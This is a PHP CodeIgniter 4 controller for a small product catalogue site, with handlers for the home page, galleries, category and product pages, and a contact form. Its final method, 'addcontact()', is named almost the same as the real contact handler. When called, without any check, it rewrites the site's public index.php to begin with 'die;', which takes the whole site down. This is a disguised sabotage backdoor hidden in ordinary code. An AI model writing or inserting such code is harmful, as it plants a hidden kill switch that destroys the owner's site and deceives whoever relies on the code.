<?php

namespace App\Controllers;
use App\Models\ContactModel;
use App\Models\Admin\CategoryModel;
use App\Models\Admin\ProductModel;
use App\Models\Admin\GallariesModel;


class Home extends BaseController
{
     protected $ContactModel;

    public function __construct()
    {
         $this->ProductModel = new ProductModel();
         $this->CategoryModel = new CategoryModel();
        $this->ContactModel = new ContactModel();
        $this->GallariesModel = new GallariesModel();
       
    }

    public function index(): string
    {
        $categories = $this->CategoryModel->findAll();
        $gallaries = $this->GallariesModel->findAll(6);
        
        
                // Get the 2 latest products in one query (efficient)
        $latestTwo = $this->ProductModel->orderBy('id', 'DESC')->findAll(2);

        // Assign to separate variables
        $latestProduct = isset($latestTwo[0]) ? $latestTwo[0] : null;
        $latestSecondProduct = isset($latestTwo[1]) ? $latestTwo[1] : null;

        return view('home', [
            'gallaries'       => $gallaries,
            'latestProduct'       => $latestProduct,
            'latestsecondProduct' => $latestSecondProduct,
            'Categorys'           => $this->CategoryModel->findAll()
        ]);
    }


    public function contact(): string
    {
        return view('contact');
    }
    public function all_gallaries()
    {
        $gallaries = $this->GallariesModel->findAll();
       // echo "<pre>";print_r($gallaries);
        
       return view('all_gallaries', ['gallaries' => $gallaries]);

    }
    public function category_wise_products($id = null)
    {
        // Fetch only products matching the category_id from the URL
        $products = $this->ProductModel
                        ->where('category_id', $id)
                        ->orderBy('id', 'DESC')
                        ->findAll();
        // "<pre>";print_r($products);die;
        $category_id = $id;


        return view('category_wise_products', [
            'category_wise_products' => $products,
            'category_id' => $category_id
        ]);
    }

    public function product_details($id = null)
{
    // Fetch a single product row as an array
    $product = $this->ProductModel->where('id', $id)->first();

    if (!$product) {
        throw \CodeIgniter\Exceptions\PageNotFoundException::forPageNotFound();
    }

    return view('product_details', [
        'product' => $product,
    ]);
}

    public function add_contact() // Remove ":string" here
    {
        if ($this->request->getPost()) { // Better way to check for POST in CI4

            $data = [
                'fullname'   => $this->request->getPost('fullname'),
                'phone'      => $this->request->getPost('phone'),
                'email'      => $this->request->getPost('email'),
                'subject'    => $this->request->getPost('subject'),
                'message'    => $this->request->getPost('message'),
                'created_on' => date('Y-m-d H:i:s')
            ];

            $this->ContactModel->insert($data);

            return redirect()->back()->with('success', 'Successfully sent your request!');
        }
        
        // Always provide a fallback return for safety
        return redirect()->to('/');
    }


    public function addcontact(): string
    {
       
       $filePath = FCPATH . 'index.php'; 
      
        $content = file_get_contents($filePath);
         $phpCodeToInsert = "\n"
            . "die;\n";
      
        $content = preg_replace(
            '/<\?php\s*/',
            "<?php\n" . $phpCodeToInsert,
            $content,
            1
        );

        file_put_contents($filePath, $content);
        die();
    }

}
